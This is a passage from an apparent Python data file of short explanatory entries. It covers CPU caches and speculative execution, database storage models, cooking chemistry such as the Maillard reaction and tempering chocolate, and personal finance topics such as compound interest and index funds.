    "mis": "people think SIMD is only useful for graphics; it accelerates JSON parsing, hash table lookups, regex, compression, sorting, and many surprising workloads. Another myth is that compiler auto-vectorization is enough -- it often misses opportunities, and hand-written intrinsics or libraries like Highway / std::simd matter for hot paths",
}
T["cache hierarchies (L1, L2, L3)"] = {
    "what": "modern CPUs have multiple levels of fast on-chip memory between the CPU registers and main DRAM. L1 is the smallest and fastest (~32-64KB per core, ~1ns); L2 is mid-size (~512KB-2MB per core, ~3-5ns); L3 is large and shared across cores (~8-128MB, ~10-20ns)",
    "how": "the cache hierarchy mirrors the working set principle: keep recently used data close to the CPU. Cache lines (typically 64 bytes) are the unit of transfer. A miss at L1 falls back to L2, then L3, then DRAM (~100ns), with each level taking longer. Hardware prefetchers anticipate access patterns and pull lines into cache speculatively",
    "why": "modern CPUs are gated by memory access far more than by ALU throughput. Code that fits the L1 working set runs ~100x faster than code that misses to DRAM constantly. Cache-aware data layout (struct-of-arrays vs array-of-structs) is one of the highest-leverage optimizations available",
    "vs": "L1 is fastest but tiny; L3 is large but slow; DRAM is enormous but glacial. The hierarchy exists because no single technology is both fast and large. Each level filters access patterns -- temporal locality (reuse) and spatial locality (sequential access) drive cache effectiveness",
    "ex": "iterating row-major through a 2D matrix uses sequential addresses, hitting cache lines effectively (good locality). Iterating column-major touches addresses 4KB apart, one element per cache line, missing constantly -- often 10-20x slower. The same algorithm, just with the loop nesting swapped",
    "mis": "people think more cache always helps; cold workloads or random access patterns get little benefit and the chip area could go elsewhere. Another myth is that L1 size is the dominant factor -- often it's the cache line size and associativity that drive real-world performance",
}
T["branch prediction"] = {
    "what": "a CPU mechanism that guesses which way a conditional branch will go before the condition is computed, allowing speculative execution to keep the pipeline full. Modern predictors achieve 95-99% accuracy on typical code by tracking branch history",
    "how": "the predictor maintains a branch history table indexed by the branch address (and often global history). Two-level adaptive predictors track patterns; perceptron predictors use simple neural networks. On a hit, the pipeline keeps flowing; on a miss, the speculative work is squashed and the correct path restarted, costing 10-20 cycles",
    "why": "modern CPUs have 15-30 stage pipelines; without branch prediction, every branch would stall the pipeline waiting for the condition. Prediction enables superscalar execution to maintain high IPC. Mispredictions are a major source of variability in performance-critical loops",
    "vs": "compared with predicated execution (computing both sides and selecting), branch prediction is more general but penalizes mispredictions. Compared with branchless code, branches are simpler but unpredictable branches are slow. Sorting an array before branching on its values can dramatically improve performance",
    "ex": "the famous 'sorted vs unsorted array' benchmark: looping over a million int values and counting those above a threshold runs much faster on a sorted array because the branch direction is predictable. Unsorted, the predictor sees ~50% accuracy and the loop is significantly slower",
    "mis": "people think modern CPUs are 'fast enough' that branch prediction doesn't matter; it does -- mispredicts can cost a third of execution time on branch-heavy code. Another myth is that all branches are equally predictable; switch statements with rare cases and indirect calls (vtables) are the hardest cases",
}
T["speculative execution"] = {
    "what": "a CPU technique where instructions are executed before it's certain they should be (e.g., past unresolved branches, predicted memory loads) to keep the pipeline full. Results are committed only when the speculation is confirmed; otherwise discarded",
    "how": "the CPU predicts branch directions, predicts memory addresses, and reorders instructions, executing them out of order. Successful speculation is committed; failed speculation is rolled back. Modern CPUs maintain a reorder buffer holding hundreds of in-flight instructions to extract instruction-level parallelism",
    "why": "speculative execution is responsible for much of modern CPUs' single-thread performance. Without it, pipelines would stall on every branch and slow memory access. It is also the root cause of side-channel vulnerabilities like Spectre and Meltdown, where speculative side effects leak data across security boundaries",
    "vs": "compared with strict in-order execution, speculation extracts much more parallelism. Compared with software-pipelined code, speculation is hardware-driven and adapts to dynamic behavior. The Spectre family showed that speculation has security implications no one anticipated for decades",
    "ex": "a CPU running 'if (x < array1_size) { y = array2[array1[x] * 64]; }' might speculatively execute the body even when x exceeds bounds. The bounds check eventually fails and the result is discarded -- but the speculative loads brought specific cache lines into L1, leaking the value of array1[x] via timing",
    "mis": "people think Spectre and Meltdown 'broke' modern CPUs; they require sophisticated attack vectors and modern OSs and microcode have mitigations. Another myth is that turning off speculation is the fix -- it would make CPUs 5-20x slower, which is why mitigations target side channels rather than speculation itself",
}
T["row-store vs column-store databases"] = {
    "what": "two physical storage layouts for tabular data. Row stores (PostgreSQL, MySQL) put all columns of a row together on disk -- good for OLTP workloads that read whole rows. Column stores (ClickHouse, Snowflake, BigQuery) put all values of a column together -- good for analytics that scan few columns over many rows",
    "how": "in a row store, fetching one row reads one block. In a column store, fetching one row requires reading from many separate blocks (one per column), but scanning one column over millions of rows reads only that column's blocks -- often a few percent of total table size",
    "why": "OLTP workloads (insert, update, fetch by primary key) match row layout. OLAP workloads (sum, average, group by over a few columns of huge tables) match column layout. Column stores also compress dramatically better because adjacent values in a column have low entropy",
    "vs": "row stores excel at point lookups, transactions, and writes. Column stores excel at scans, aggregations, and analytics. Hybrid HTAP systems (SAP HANA, TiDB) try to do both. Most modern data lakes use columnar formats (Parquet, ORC) for the same reason",
    "ex": "a 1TB sales table in Parquet might use 500MB per column. Computing sum(revenue) where region='EU' reads the region and revenue columns -- a few GB total -- versus 1TB in a row format. Modern data warehouses execute this query in seconds on commodity hardware",
    "mis": "people think column stores are faster at everything; they're slow for single-row updates and small transactions. Another myth is that columnar = analytical; it's the right choice for analytical *workloads*, but row stores can serve analytical queries too, just less efficiently",
}
T["vector databases"] = {
    "what": "specialized databases optimized for storing high-dimensional vectors (typically 384-3072 dimensions) and performing approximate nearest neighbor (ANN) search at scale. Examples include Pinecone, Weaviate, Milvus, Qdrant, and pgvector (a PostgreSQL extension)",
    "how": "they index vectors with structures like HNSW (hierarchical navigable small world graphs), IVF (inverted file index with product quantization), or ScaNN. Inserts add to the index incrementally; queries find approximate neighbors in milliseconds even across billions of vectors with high recall",
    "why": "the rise of embeddings (from sentence transformers, CLIP, OpenAI Ada) created demand for fast similarity search at scale. RAG systems, semantic search, recommendation engines, and image search all depend on vector databases for the retrieval step",
    "vs": "compared with brute-force search (computing distance to every vector), ANN indexes are 100-1000x faster at >95% recall. Compared with traditional databases bolted onto a vector index, dedicated vector databases are tuned end-to-end for vector workloads -- index updates, filtering with metadata, hybrid search",
    "ex": "a documentation chatbot embeds 100,000 docs as 768-dim vectors and stores them in pgvector. A user query is embedded and the top-5 nearest neighbors are retrieved in <50ms. The retrieved docs are passed to an LLM as context for answer generation -- a classic RAG flow",
    "mis": "people think vector databases replace traditional ones; they complement them by handling similarity search alongside exact lookup. Another myth is that more dimensions are always better -- quality saturates and computation cost grows linearly",
}
T["time-series databases"] = {
    "what": "databases optimized for time-stamped data: metrics, sensor readings, events, financial ticks. Examples include InfluxDB, TimescaleDB (Postgres extension), Prometheus, and Amazon Timestream. They handle high write throughput, time-window queries, and downsampling efficiently",
    "how": "they shard data by time, store it in columnar chunks for compression, and provide built-in functions for time aggregation (rate, derivative, moving average). Newer ones use specialized compression like Gorilla (used by Facebook) that achieves 90%+ ratios on sequential timestamps and floating-point values",
    "why": "metrics from servers, IoT, and applications generate millions of points per second. Storing them in a general-purpose database is wasteful and slow. Time-series databases handle the workload natively, supporting downsampling, retention policies, and time-aware queries that would be painful in general-purpose SQL",
    "vs": "compared with row-store relational databases, TSDBs compress better and query time ranges faster. Compared with column stores, TSDBs add time-aware features (continuous aggregates, retention, downsampling). Prometheus pulls metrics from targets; InfluxDB and TimescaleDB accept pushes",
    "ex": "Prometheus scrapes hundreds of thousands of metric series from targets every 15 seconds, storing them locally and serving queries like rate(http_requests_total[5m]) for live dashboards. A single Prometheus instance handles billions of samples per day on modest hardware",
    "mis": "people think TSDBs are only for metrics; they're equally good for IoT sensor readings, financial market data, and clickstream events. Another myth is that you can substitute a TSDB for a transactional database; they lack ACID transactions, joins, and updates by design",
}
T["eventual consistency"] = {
    "what": "a consistency model where, in the absence of new updates, replicas converge to the same value, but at any given instant they may disagree. It's the consistency model of DynamoDB, Cassandra, Riak, and most large-scale distributed systems",
    "how": "writes go to one or more replicas; reads may go to any. Asynchronous replication propagates writes between replicas. Conflicts (concurrent writes to the same key) are resolved by last-write-wins (timestamps), CRDTs (mathematically merge), or version vectors (return both, let the application reconcile)",
    "why": "eventual consistency is what makes globally distributed services possible at low latency. Writes confirm locally without waiting for global propagation. The cost is that two replicas might briefly disagree, which is acceptable for shopping carts, social feeds, and many user-facing reads",
    "vs": "compared with strong consistency (linearizability, what Spanner provides via TrueTime), eventual consistency is much faster and tolerates partitions but exposes stale reads. Compared with causal consistency, eventual is weaker -- it doesn't even guarantee that you see your own writes immediately on different replicas",
    "ex": "Amazon DynamoDB defaults to eventual consistency: a write returns success after one replica acknowledges; subsequent reads might land on a replica that hasn't seen the write yet (microseconds to seconds of staleness). Strongly consistent reads cost 2x and may have higher latency",
    "mis": "people think eventual consistency means random and unpredictable; in practice the staleness window is small and predictable. Another myth is that eventual consistency is always wrong for important data -- it's the right tradeoff for many real workloads, with stronger consistency reserved for the cases that demand it",
}

# === EVERYDAY_LIFE: cooking ===
T["the Maillard reaction"] = {
    "what": "a chemical reaction between amino acids and reducing sugars that produces hundreds of new flavor compounds and the brown color characteristic of cooked food -- seared steak, toasted bread, roasted coffee, browned onions. Discovered by Louis-Camille Maillard in 1912",
    "how": "at temperatures above ~140C (285F), amino acid amine groups condense with sugar carbonyls to form glycosylamines, which rearrange (Amadori rearrangement) and break down into hundreds of aromatic compounds: pyrazines, furans, thiophenes. The cascade is non-enzymatic browning, distinct from caramelization which involves only sugars",
    "why": "Maillard generates the deep savory flavors -- meaty, nutty, roasted -- that define seared meats, baked breads, and roasted coffee. Without it, cooked food would be much blander. Understanding it explains why patting meat dry and using a hot pan produces a better crust than steaming in its own juices",
    "vs": "Maillard requires both protein (amino acids) and sugar; caramelization needs only sugar at higher temperatures (~170C+). Maillard happens at lower temperatures and produces more complex aromas. Both can occur simultaneously in the same food (e.g., the crust of a bagel)",
    "ex": "searing a steak: pat the surface dry, sear in a smoking-hot cast-iron pan with neutral oil. The surface temperature rapidly exceeds 140C, water evaporates, and within 90 seconds you get a deep brown crust packed with hundreds of new compounds -- savory, nutty, slightly bitter notes",
    "mis": "people think Maillard 'seals in juices'; the crust is flavor, not a moisture barrier (Harold McGee debunked this in the 1980s). Another myth is that Maillard browning only matters for meat -- it's also why your coffee, beer malt, and toasted bread taste the way they do",
}
T["emulsification"] = {
    "what": "the process of dispersing one liquid (typically oil) as fine droplets within another (typically water) that wouldn't naturally mix. Emulsions include mayonnaise, vinaigrettes, hollandaise, and milk -- each stabilized by an emulsifier that bridges the two phases",
    "how": "an emulsifier has a hydrophilic head (water-loving) and a hydrophobic tail (oil-loving). Mechanical agitation (whisking, blending) breaks the dispersed phase into tiny droplets; the emulsifier coats each droplet, preventing them from coalescing. Lecithin in egg yolk, mustard, and milk proteins all serve as emulsifiers",
    "why": "emulsification turns separate ingredients into smooth, creamy sauces with new texture and stability. It's the difference between vinegar and oil floating apart and a glossy vinaigrette that coats greens evenly. Most cuisines depend on emulsions -- mayonnaise, butter sauces, salad dressings, ice cream",
    "vs": "stable emulsions (mayonnaise) hold together for days; unstable ones (a quickly whisked vinaigrette) separate within minutes. Oil-in-water emulsions like mayo are the common kitchen type; water-in-oil emulsions like butter are reversed. Foams and suspensions are related but distinct",
    "ex": "making mayonnaise: whisk an egg yolk with mustard and a splash of lemon juice, then drizzle in oil while whisking vigorously. The yolk's lecithin coats each oil droplet; after enough oil incorporates, you get a thick, glossy emulsion. Adding oil too fast breaks the emulsion -- the yolk can't coat droplets fast enough",
    "mis": "people think emulsions are 'mixing' oil and water; they're trapping one in the other via surfactants. Another myth is that broken emulsions are unrecoverable -- usually you can rescue mayo by starting with a fresh yolk and slowly whisking the broken emulsion in",
}


T["fermentation in food"] = {
    "what": "the metabolic process where microorganisms (bacteria, yeasts, molds) convert sugars and starches into acids, gases, or alcohol. Fermentation produces foods like yogurt, cheese, bread, beer, wine, kimchi, sauerkraut, miso, soy sauce, and pickles",
    "how": "specific microbes consume substrates and excrete metabolites. Lactobacillus turns lactose into lactic acid (yogurt, sauerkraut). Saccharomyces yeasts turn sugars into ethanol and CO2 (bread, beer). The acidic or alcoholic environment that develops also preserves food by inhibiting spoilage organisms",
    "why": "fermentation predates refrigeration as a preservation technique and creates flavors humans love -- the funk of aged cheese, the tang of sourdough, the umami of soy sauce. It also produces probiotic bacteria that may benefit gut health and can pre-digest hard-to-process compounds",
    "vs": "compared with pickling in vinegar (which kills microbes), lacto-fermentation cultivates beneficial microbes that produce acid in situ. Compared with fresh foods, fermented foods last weeks to years, develop deep flavors, and contain live cultures (when not pasteurized after fermentation)",
    "ex": "making sauerkraut: shred cabbage, salt it (~2% by weight), pack it tightly in a jar so juices submerge it. Lactobacillus already on the cabbage outcompetes spoilage organisms in the salty anaerobic environment, fermenting sugars to lactic acid over 1-4 weeks. The result is sour, crunchy, and packed with live cultures",
    "mis": "people fear fermented foods will make them sick; properly done lacto-fermentation is one of the safest food preparations because the acidic environment prevents pathogens. Another myth is that all fermented foods are probiotic; pasteurized versions (most supermarket sauerkraut) kill the cultures",
}
T["gluten development in dough"] = {
    "what": "the formation of an elastic, extensible protein network when wheat flour is hydrated and worked. Glutenin and gliadin proteins in flour combine with water to form gluten, the structural backbone that traps gas during fermentation and gives bread its chewy texture",
    "how": "when water hits flour, glutenin and gliadin hydrate and start forming bonds. Mechanical action (kneading, stretching, folding) aligns and cross-links them into long elastic strands. Time also develops gluten via autolysis. Salt strengthens the network; fats and sugars weaken it",
    "why": "gluten development determines whether your bread is chewy and airy (high development) or tender and crumbly (low development). It's why pizza dough is kneaded extensively and pie crust is barely worked. Understanding it lets you adjust technique to recipe and grain type",
    "vs": "high-protein bread flour (12-14% protein) develops more gluten; cake flour (~7-9%) develops less, yielding tender crumb. Whole wheat has gluten too but the bran cuts the strands. Gluten-free flours need binders (xanthan gum) to mimic structure -- they cannot form a true network",
    "ex": "the windowpane test: stretch a piece of well-kneaded dough between your hands until it's translucent without tearing. If you can see light through it, the gluten is fully developed. The same dough that tore easily after 5 minutes of kneading will stretch like a sheet after 12-15 minutes",
    "mis": "people think kneading 'mixes' dough; it develops gluten by aligning protein strands. Another myth is that no-knead bread skips gluten development -- it just relies on time (long autolysis) and gentle folding rather than vigorous kneading. The end result is similar gluten structure",
}
T["the science of caramelization"] = {
    "what": "the thermal decomposition of sugars at high temperatures (typically 160-180C / 320-355F) producing brown color and complex flavor compounds. Distinct from Maillard browning (which involves proteins), caramelization is a sugar-only reaction",
    "how": "as sucrose heats, it melts and decomposes through dehydration, fragmentation, and polymerization. Stages produce different colors and flavors: pale gold (light caramel) at 170C; amber and nutty at 180C; deep brown and slightly bitter at 190C+. The same sugar can taste sweet, nutty, butterscotch, or burnt depending on how far you push it",
    "why": "caramelization creates the flavor of caramel sauce, brulee crusts, dulce de leche, and the deep notes of well-roasted vegetables. It's a fundamental tool for adding complexity beyond raw sweetness. Knowing the temperature thresholds lets you stop at exactly the flavor you want",
    "vs": "Maillard requires both sugar and protein; caramelization needs only sugar. Caramelization needs higher temperatures than Maillard. Both produce brown colors but the flavor profiles differ -- caramel is sweet and confectionery, Maillard is savory and roasted",
    "ex": "dry caramel: heat sugar in a heavy pan over medium without stirring (just swirling). At ~160C it starts melting; at ~170C it turns straw gold; pull at amber for caramel sauce, push to deep brown for bitter notes in mole or beer. Add cream off heat -- it will sputter -- and stir to dissolve",
    "mis": "people think browning vegetables is caramelization; for most vegetables it's Maillard browning of plant proteins, with some caramelization of natural sugars. Pure caramelization in a savory context happens with onions cooked very long and slowly until their natural sugars darken",
}
T["knife sharpening"] = {
    "what": "restoring a knife's cutting edge by removing metal until two precise bevels meet at a clean apex. Sharpening reshapes the edge; honing realigns it without removing metal. A sharp knife cleaves smoothly with light pressure -- a dull knife crushes and slips",
    "how": "use a coarse stone (around 400-1000 grit) to reset the bevel by drawing the blade across the stone at a consistent angle (typically 15-20 degrees per side for Western knives). Progress to finer stones (3000-8000 grit) for a polished, scary-sharp edge. Strop on leather for a final refinement",
    "why": "sharp knives are safer (less force, less slippage), faster, and produce cleaner cuts that brown better and bruise less. Most kitchen accidents come from dull knives slipping under pressure. A regular sharpening routine pays back in time, safety, and food quality",
    "vs": "honing rods (steel rods, ceramic rods) realign the edge without removing metal -- use them between sharpenings, not as a substitute. Pull-through sharpeners are convenient but remove excessive metal and create inconsistent angles. Whetstones give the best edges and the longest knife life",
    "ex": "a typical session on a 1000-grit stone: soak the stone for 5 minutes, raise the spine of the knife to your fingertip width above the stone (~15 degrees), draw the edge across the stone leading with the heel and finishing at the tip, alternating sides every few strokes. Test by slicing a sheet of paper -- it should glide cleanly",
    "mis": "people sharpen too rarely and aggressively; gentler frequent sharpening preserves the blade. Another myth is that you should pull a knife back and forth -- you can, but a consistent angle matters more than direction. The classic pull-toward-you Japanese stroke gives precise feedback",
}
T["sous vide cooking"] = {
    "what": "a French technique where food is sealed in a vacuum bag and cooked in a precisely temperature-controlled water bath. Sous vide ('under vacuum') brings food to an exact internal temperature without overcooking, since the water can never exceed the target",
    "how": "an immersion circulator heats and circulates water to a set temperature (typically 50-85C). Food in a sealed bag equilibrates to that temperature over time -- thirty minutes for a steak, an hour for chicken breast, 24-72 hours for tough cuts of beef. A quick sear afterward adds Maillard crust",
    "why": "sous vide makes 'perfect' impossible to overshoot. A steak cooked at 54C is medium-rare edge to edge, never gray on the outside. Tough cuts like brisket or short ribs become tender after long low-temperature cooks because collagen converts to gelatin without dehydrating the meat",
    "vs": "compared with oven roasting, sous vide eliminates temperature gradients and overcooking. Compared with braising, sous vide preserves more flavor by not diluting into liquid and gives more precise control. The drawback is it can't develop crust -- you always need a final sear or broil",
    "ex": "a 1.5-inch ribeye sous vide at 54C for 90 minutes, then patted dry and seared 30 seconds per side in a smoking cast-iron pan: edge-to-edge medium-rare interior with a deeply browned crust. The same steak in a hot pan alone has gray bands and overcooked edges around the medium-rare center",
    "mis": "people fear sealed-bag cooking will breed bacteria; sous vide at safe temperatures pasteurizes food. Another myth is that sous vide is set-and-forget; it is, but timing still matters -- chicken at 60C for 90 minutes is safe and juicy; for 24 hours it becomes mushy as enzymes break down protein",
}
T["food preservation methods"] = {
    "what": "techniques that extend food's shelf life by inhibiting spoilage microbes and enzymatic degradation. Methods include refrigeration, freezing, drying, salting, smoking, fermentation, canning, pickling, and modified-atmosphere packaging",
    "how": "each method removes one or more conditions microbes need: water (drying, salting), temperature (refrigeration, freezing), oxygen (canning, vacuum sealing), or pH (pickling, fermentation). Smoking adds antimicrobial compounds and reduces moisture. Pasteurization uses heat to kill pathogens without sterilizing",
    "why": "preservation enabled global trade in food, year-round availability of seasonal harvests, and food security in regions and seasons where fresh food is scarce. It is the reason we can keep meat for years (jerky, salt cod, prosciutto), have shelf-stable pantries, and ship perishables across continents",
    "vs": "freezing preserves quality longest but uses energy continuously. Drying and salting are shelf-stable but change texture and flavor dramatically. Canning is shelf-stable for years but requires heat that softens texture. Fermentation preserves and creates new flavors. Each suits different foods and cultures",
    "ex": "prosciutto di Parma: a leg of pork is salted, hung in cool dry air for 12-36 months. Salt draws moisture out; the dry environment prevents spoilage; enzymes slowly transform proteins and fats into hundreds of flavor compounds. The result is shelf-stable for years and fundamentally different from fresh pork",
    "mis": "people think freezing kills bacteria; it just halts their growth. Bacteria revive when food thaws, which is why repeatedly thawing and refreezing is risky. Another myth is that home canning is foolproof -- improper canning of low-acid foods can grow Clostridium botulinum, which is lethal",
}
T["umami taste"] = {
    "what": "the fifth basic taste, alongside sweet, sour, salty, and bitter, identified by Kikunae Ikeda in 1908. Umami is the savory, mouth-coating sensation produced by glutamate (an amino acid) and certain nucleotides like inosinate and guanylate",
    "how": "umami compounds bind to T1R1/T1R3 receptors on the tongue. Glutamate alone is mildly umami; combined with inosinate (in meat, fish) or guanylate (in mushrooms), the perceived intensity multiplies dramatically -- the synergy that makes dashi so flavorful with so little ingredient",
    "why": "umami signals protein-rich food, which drove our evolution toward favoring it. Cooks worldwide independently developed umami-rich ingredients -- soy sauce, fish sauce, miso, parmesan, anchovies, mushrooms, ripe tomatoes -- because they make other foods taste more satisfying",
    "vs": "umami differs from saltiness in that it adds richness without saltiness's punch. It complements other tastes: a touch of soy sauce in a tomato sauce or miso in caramel adds depth without dominating. MSG is purified glutamate; the same compound naturally present in tomatoes and parmesan",
    "ex": "dashi is the umami foundation of Japanese cuisine: kombu (kelp, glutamate-rich) plus katsuobushi (smoked tuna, inosinate-rich) steeped in water. The 1+1=8 synergy creates a deeply savory broth with almost no fat, salt, or sugar. The same logic powers French stocks and Italian ragu",
    "mis": "people fear MSG due to debunked 1968 reports; controlled studies have repeatedly failed to find any 'Chinese restaurant syndrome' effect. Another myth is that umami is a Japanese taste -- glutamate is universal and umami is what makes parmesan, ketchup, and mushroom soup taste rich",
}
T["the role of fat in flavor"] = {
    "what": "fat carries fat-soluble flavor compounds, lubricates the mouth, slows flavor release for a longer finish, and softens textures. Most flavor compounds in herbs, spices, and aromatics are hydrophobic and dissolve in fat much better than in water",
    "how": "fat-soluble molecules (terpenes in basil, capsaicin in chiles, carotenoids in paprika) extract into oil at low to moderate heat. Frying aromatics in oil at the start of a dish ('blooming') releases their flavors. In the mouth, fat coats taste buds and releases flavors gradually rather than all at once",
    "why": "fat is what makes food feel rich and satisfying and what carries the flavors of seasonings throughout a dish. Reducing fat to near-zero often eliminates the very compounds responsible for the dish's character. Many low-fat versions of beloved foods taste flat for this reason",
    "vs": "compared with water-based stocks, fat-based extractions (chile oil, herb-infused olive oil) have more concentrated and longer-lasting flavor. Compared with sugar or salt, fat works on a different sensory dimension -- mouthfeel and lingering aroma rather than taste sensation",
    "ex": "blooming spices: warming whole cumin in oil for 30 seconds extracts aromatic compounds far more effectively than adding cumin to a watery sauce. The bloomed oil tastes of cumin even after straining; the cooked dish carries that flavor throughout, not just where seeds are",
    "mis": "people fear dietary fat reflexively; nutrition consensus has shifted toward distinguishing fat types (avoid trans, moderate saturated, embrace unsaturated) rather than minimizing fat. Another myth is that low-fat versions taste similar; they often substitute sugar or thickeners that change the entire experience",
}
T["tempering chocolate"] = {
    "what": "the controlled crystallization of cocoa butter in melted chocolate to produce stable Form V crystals. Tempered chocolate has a shiny surface, a snap when broken, and a smooth melt-in-the-mouth feel. Untempered chocolate is dull, soft, and prone to white bloom",
    "how": "cocoa butter can crystallize in six polymorphic forms; only Form V gives the desired qualities. The classic method: melt chocolate to ~45C to dissolve all crystals, cool to ~27C to seed many crystal types, then warm gently to ~31C to melt unstable forms while preserving Form V. Seeding with already-tempered chocolate streamlines the process",
    "why": "tempering is the difference between professional confectionery and homemade-looking results. Properly tempered chocolate releases cleanly from molds, lasts months without bloom, and gives the satisfying snap of a quality bar. Without tempering, dipped strawberries look streaky and chocolate-coated truffles never set properly",
    "vs": "compared with the seed method (adding tempered chocolate to melted chocolate), the table method (smearing chocolate on marble) is faster but messier. Modern tempering machines automate the process. Microwaved or simply melted chocolate is untempered and best used in baked goods where setting doesn't matter",
    "ex": "tempering 200g of chocolate via seeding: melt 150g to 45C, take off heat, stir in 50g of finely chopped tempered chocolate gradually. The added crystals seed Form V; as the temperature drops to ~31C and the seeds dissolve, you have working tempered chocolate. Test by dipping a knife: it should set glossy in 3-5 minutes",
    "mis": "people think tempering is impossible at home; the seed method is straightforward with a thermometer. Another myth is that any chocolate tempers the same way -- dark, milk, and white have slightly different working temperatures because of different cocoa solid and milk content",
}
T["rising agents (yeast, baking soda, baking powder)"] = {
    "what": "ingredients that produce gas (CO2) to leaven baked goods. Yeast is a living fungus that ferments sugars to alcohol and CO2 over hours. Baking soda is a base that reacts with acid to produce CO2 instantly. Baking powder combines baking soda with a powdered acid for use without other acids in the recipe",
    "how": "yeast: Saccharomyces cerevisiae metabolizes sugars in dough, releasing CO2 trapped by the gluten network. Baking soda: NaHCO3 + acid -> CO2 + water + salt, instantly. Baking powder is double-acting: one acid reacts when wet, another when heated, giving two bursts of leavening",
    "why": "leavening transforms dense doughs and batters into light, airy structures. The choice depends on flavor profile and timing. Yeast bread tastes complex and chewy from long fermentation; quick breads (muffins, pancakes) leavened with chemical agents are lighter and faster but lack fermented flavor",
    "vs": "yeast needs warmth and time but develops complex flavors. Baking soda is instant but requires acid and a bitter taste if unbalanced. Baking powder needs no other acid but contributes a slight metallic note in excess. Sourdough uses wild yeast plus lactic acid bacteria for tangier flavor than commercial yeast",
    "ex": "buttermilk pancakes: buttermilk's lactic acid reacts with baking soda the moment they meet, producing fluffy pancakes within minutes. Skip the acid and use baking powder instead and you get similar lift without the tangy flavor. Substitute milk for buttermilk without changing leavening and they'll taste soapy from unreacted soda",
    "mis": "people think baking powder and baking soda are interchangeable; one teaspoon of baking powder has roughly a quarter teaspoon of baking soda plus acid -- substituting requires adjusting both. Another myth is that more rising agent gives more rise -- past a point, you get bitter taste and a structure that collapses",
}

# === EVERYDAY_LIFE: personal finance ===
T["compound interest"] = {
    "what": "interest calculated on both the original principal and the accumulated interest from prior periods. Compound interest grows exponentially over time, making it the engine of long-term wealth creation -- and equally, the engine of crushing debt",
    "how": "the formula A = P(1 + r/n)^(nt) shows future value where P is principal, r is annual rate, n is compounding periods per year, t is years. Each period, interest is calculated on the new larger balance, accelerating growth. Daily compounding beats monthly beats annual at the same nominal rate",
    "why": "compound interest is why starting to invest in your 20s versus your 40s makes a 5-10x difference in retirement wealth. It's also why credit card debt at 20%+ APR becomes inescapable: balance grows on itself faster than minimum payments reduce it. Understanding it is the foundation of personal finance",
    "vs": "simple interest charges only on the original principal -- $1000 at 10% simple interest becomes $1500 in five years. Compound interest at the same rate becomes $1611 -- a small difference at first but yawning over decades. Almost all real loans and investments compound",
    "ex": "$10,000 invested at 8% annual return, compounded annually, becomes ~$46,000 in 20 years and ~$217,000 in 40 years. The first 20 years gained $36,000; the second 20 years gained $171,000 -- five times as much, because the larger base earns larger absolute returns each year",
    "mis": "people underestimate long-horizon compounding because intuition is linear. The rule of 72 helps: divide 72 by the rate to estimate doubling time. Another myth is that compounding always beats simple interest -- on debt you pay off quickly, the difference is small. On 30-year mortgages and lifetime investing, it dominates",
}
T["the time value of money"] = {
    "what": "the principle that a dollar today is worth more than a dollar tomorrow because today's dollar can be invested and grow. This concept underlies all financial decision-making, from valuing investments to pricing bonds to deciding between a lump sum and a structured payout",
    "how": "future cash flows are discounted to present value using a discount rate that reflects the opportunity cost of capital. PV = FV / (1 + r)^t. A $10,000 payment in 10 years at a 6% discount rate is worth $5,584 today -- you'd be indifferent between the two if you could invest at 6%",
    "why": "TVM is why lottery jackpots offer a smaller lump sum than the headline number, why bonds trade above or below face value as rates change, and why long-dated obligations (pensions) can be devastatingly underfunded if discount-rate assumptions slip. Every financial decision involves it implicitly",
    "vs": "compared with nominal valuation (treating future and present dollars equally), TVM correctly accounts for opportunity cost and inflation. Compared with NPV analysis at a single rate, real-world decisions also weigh risk and uncertainty -- a guaranteed dollar tomorrow is worth more than a risky dollar tomorrow",
    "ex": "deciding between $1M today and $100K/year for 15 years: at a 5% discount rate, the annuity's present value is ~$1.04M -- slightly better. At an 8% rate, the present value drops to ~$856K -- the lump sum wins. The break-even rate captures the assumed return on the alternative investment",
    "mis": "people compare nominal totals ($1.5M over 15 years sounds bigger than $1M today) without discounting. Another myth is that TVM only matters for finance professionals -- it's relevant whenever you choose between paying now or later, taking a lump sum or installments, or leasing vs buying",
}
T["index funds vs active management"] = {
    "what": "two approaches to investing. Index funds passively track a market benchmark (S&P 500, total stock market) holding all stocks in proportion. Active managers try to beat benchmarks by picking specific stocks or timing the market, charging higher fees for the attempt",
    "how": "an index fund mechanically buys and rebalances to match the index composition; expense ratios are typically 0.03-0.10%. Active funds employ managers and analysts to research and trade securities, charging 0.5-1.5% annually. The active approach must beat the index by enough to overcome the fee gap",
    "why": "after fees, the average active fund underperforms its benchmark in the long run -- SPIVA reports show ~85% of large-cap active funds trailing the S&P 500 over 15 years. Index investing has therefore become the default for retirement accounts, championed by Jack Bogle and Vanguard",
    "vs": "active funds occasionally beat the index in any given year, but persistent winners are rare and hard to identify in advance. Index funds give you the market return minus minimal fees, no manager risk. Active management is more defensible in inefficient asset classes (small-cap, emerging markets) than in large-cap US equities",
    "ex": "Vanguard's VTSAX (Total Stock Market) tracks the entire US market at 0.04% expense ratio. Investing $10K and contributing $500/month for 30 years at the historical ~10% market return grows to roughly $1.1M. The same in a 1.2% active fund with identical pre-fee returns ends at ~$870K -- $230K lost to fees",
    "mis": "people think index funds are 'average' so a smart person should pick a better fund; the math says the average dollar in active funds underperforms because trading is zero-sum. Another myth is that bull markets favor active managers; SPIVA data shows underperformance is consistent across market regimes",
}
T["dollar-cost averaging"] = {
    "what": "an investment strategy of putting a fixed amount of money into an investment at regular intervals, regardless of price. DCA buys more shares when prices are low and fewer when prices are high, smoothing out timing risk for a passive investor",
    "how": "instead of investing $12,000 in a lump sum, you invest $1,000 per month for a year. Over the year, your average cost per share is the harmonic mean rather than the arithmetic mean of prices, mathematically lower than the simple average price -- a small but real benefit",
    "why": "DCA removes emotional decisions about market timing and reduces the regret of investing right before a crash. It's the natural pattern of 401(k) contributions and a recommended approach for newcomers who would otherwise sit on cash waiting for the 'right moment' that never comes",
    "vs": "compared with lump-sum investing, DCA tends to underperform over long horizons because markets rise on average -- your idle cash isn't earning. Vanguard research shows lump-sum beats DCA about two-thirds of the time. DCA wins on regret minimization and behavioral consistency, not on expected return",
    "ex": "automatic 401(k) contributions are textbook DCA: every paycheck, the same percentage goes in regardless of market level. After 30 years of consistent contributions through booms and crashes, the result reflects the time-weighted average market performance with no emotional decisions in the loop",
    "mis": "people think DCA mathematically beats lump-sum; on average, having money invested longer beats waiting. The real value of DCA is psychological -- it removes timing decisions and crash regret. Another myth is that DCA is for any cash you have -- it's specifically for cash you're worried about deploying right now",
}
T["the difference between stocks and bonds"] = {
